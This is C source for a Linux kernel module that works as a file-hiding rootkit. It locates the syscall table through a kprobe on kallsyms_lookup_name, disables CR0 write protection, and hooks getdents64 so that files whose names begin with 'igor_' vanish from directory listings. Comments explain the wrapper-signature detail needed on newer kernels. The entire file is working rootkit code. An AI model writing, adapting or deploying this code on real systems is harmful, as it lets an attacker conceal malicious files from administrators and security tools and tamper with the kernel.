#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>


// Manually set the write bit 
static void my_write_cr0(long value) {
    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))

unsigned long *sys_call_table_address;
//asmlinkage long (*old_getdents64_sys_call)(unsigned int, struct linux_dirent64 __user *, unsigned int);
asmlinkage long (*old_getdents64_sys_call)(const struct pt_regs *regs);


static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
unsigned long * get_system_call_table_address(void) {
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
		return (unsigned long*) kallsyms_lookup_name("sys_call_table");
}

#define PREFIX "igor_"
#define PREFIX_LEN 5

// the non-obvious key point: as pointed here: https://stackoverflow.com/questions/59851520/system-call-hooking-example-arguments-are-incorrect
// starting from certain kernel versions "normal" system calls are "wrapped" so it is really needed to override not the system calls themselves 
// but wrappers! Hence the used signature should be the signature of the wrapper
// the same applies to the "old" call
//asmlinkage long hackers_getdents64(unsigned int fd, struct linux_dirent64 __user * dirp, unsigned int count){
asmlinkage long hackers_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user * orig_dirp = (struct linux_dirent64 __user *) (regs -> si);
    struct linux_dirent64 __user * dirp = orig_dirp;

		long num_bytes;
		long offset = 0;
		size_t bytes_remaining;

		num_bytes = old_getdents64_sys_call(regs);

		if (num_bytes <= 0)
			return num_bytes;
		
    //printk(KERN_NOTICE "hide_file: num bytes %ld", num_bytes);
    // logging is really useful to understand what happens if something doesn't work, 
    // however for some reason the logging itself doesn't work in Kali.
    // But it works on Mint/Ubuntu so could be tested there first

		while (offset < num_bytes) {
			dirp = (struct linux_dirent64 __user*) ((char*) orig_dirp + offset);

			if (strncmp(dirp -> d_name, PREFIX, PREFIX_LEN) != 0) {
				offset += dirp -> d_reclen;
			} else {
				bytes_remaining = num_bytes - (offset + dirp -> d_reclen);

				memmove((void*) dirp, (void*) ((char*) dirp + dirp -> d_reclen), bytes_remaining);
				num_bytes -= dirp -> d_reclen;
			}
		} 

		return num_bytes;
}

void hook_sys_call(void){
    printk(KERN_NOTICE "hide_file: hooking sys call");


    disable_write_protection();
  
  	old_getdents64_sys_call = (long int (*)(const struct pt_regs *regs)) sys_call_table_address[__NR_getdents64];
  
    if (!old_getdents64_sys_call) return;
    
    sys_call_table_address[__NR_getdents64] = (unsigned long) hackers_getdents64;
  
  	enable_write_protection();
  
    printk(KERN_NOTICE "hide_file: Hooked getdents Call");

}

void restore_getdents_sys_call(void){
    disable_write_protection();
		sys_call_table_address[__NR_getdents64] = (unsigned long) old_getdents64_sys_call;
		enable_write_protection();
}

static int startup(void){
    printk(KERN_NOTICE "hide_file: startup");

		sys_call_table_address = get_system_call_table_address();
    hook_sys_call();
    return 0;
}

static void __exit shutdown(void){
   printk(KERN_NOTICE "hide_file: restoring sys call");
   restore_getdents_sys_call();  
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");

